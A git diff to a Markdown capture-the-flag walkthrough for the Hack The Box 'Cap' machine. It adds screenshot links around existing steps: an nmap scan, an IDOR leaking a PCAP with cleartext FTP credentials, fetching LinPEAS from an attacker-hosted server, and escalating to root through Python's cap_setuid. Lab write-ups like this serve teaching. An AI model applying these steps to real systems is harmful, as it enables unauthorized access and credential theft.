@@ -22,6 +22,8 @@ Before scanning, confirm the target is reachable:
 ping 10.129.1.250
 ```
 
+![image1](HTP-Cap/Images/1pingthetarget.png)
+
 ### Step 2 — Nmap port scan
 
 Run a fast scan to identify open ports:
@@ -29,6 +31,7 @@ Run a fast scan to identify open ports:
 ```bash
 nmap -F 10.129.1.250
 ```
+![image1](HTP-Cap/Images/2startnmapscan.png)
 
 > **Note:** For more thorough real-world enumeration, consider `-p-` to scan all ports, `-T4` to speed things up, and `-sS` for a SYN scan. The `-F` flag is used here for speed.
 
@@ -36,9 +39,11 @@ nmap -F 10.129.1.250
 
 | Port | Service |
 |------|---------|
-| 21   | FTP     |
+| 21   | FTP     |  
 | 22   | SSH     |
 | 80   | HTTP    |
+
+![image1](HTP-Cap/Images/3nmapresults.png)
 
 ---
 
@@ -51,6 +56,7 @@ Navigate to the target in your browser:
 ```
 http://10.129.1.250
 ```
+![image1](HTP-Cap/Images/4websitelandingpage.png)
 
 You are greeted with a network monitoring dashboard belonging to the user **Nathan**.
 
@@ -63,6 +69,8 @@ Notice the URL ends with `/data/1`. Change the `1` to `0`:
 ```
 http://10.129.1.250/data/0
 ```
+
+![image1](HTP-Cap/Images/5changedatato0.png)
 
 This is an **Insecure Direct Object Reference (IDOR)** — the application fails to verify that the requested resource belongs to the current user. The `/data/0` snapshot contains real captured network traffic.
 
@@ -79,6 +87,8 @@ Open the downloaded PCAP in Wireshark:
 ```bash
 wireshark <filename>.pcap
 ```
+
+![image1](HTP-Cap/Images/6wiresharkpassword.png)
 
 Filter on the **FTP** protocol, as FTP transmits data in cleartext. Within the FTP stream you will quickly spot a login sequence that exposes both a **username** and a **password** in plaintext.
 
@@ -114,6 +124,8 @@ A `user.txt` file is present. Read it for the user flag:
 cat user.txt
 ```
 
+![image1](HTP-Cap/Images/7userflagcaptured.png)
+
 ---
 
 ## Privilege Escalation — Python Capabilities
@@ -135,6 +147,8 @@ Host the file over HTTP so the target can fetch it:
 python3 -m http.server 8000
 ```
 
+![image1](HTP-Cap/Images/8placeontarget.png)
+
 On the **target machine** (as `nathan`), pull the script down:
 
 ```bash
@@ -142,11 +156,15 @@ wget http://<YOUR_KALI_IP>:8000/linpeas.sh
 chmod +x linpeas.sh
 ```
 
+![image1](HTP-Cap/Images/9linpeas.png)
+
 ### Step 9 — Run LinPEAS and review results
 
 ```bash
 ./linpeas.sh
 ```
+
+![image1](HTP-Cap/Images/11runlinpeas.png)
 
 Review the output and focus on findings highlighted in **red/orange**, which LinPEAS marks as high-confidence privilege escalation paths. One finding stands out: the **Python binary has the `cap_setuid` capability set**.
 
@@ -154,7 +172,11 @@ Review the output and focus on findings highlighted in **red/orange**, which Lin
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
+![image1](HTP-Cap/Images/12linpeasrunning.png)
+
 Linux capabilities allow specific elevated privileges to be granted to binaries without making them full SUID root. `cap_setuid` allows the process to call `setuid()` — which is enough to become root.
+
+![image1](HTP-Cap/Images/13linpeasfindingtopwn.png)
 
 ### Step 10 — Exploit cap_setuid to get root
 
@@ -169,6 +191,8 @@ You now have a root shell. Retrieve the root flag:
 ```bash
 cat /root/root.txt
 ```
+
+![image1](HTP-Cap/Images/14rootflag.png)
 
 ---
 
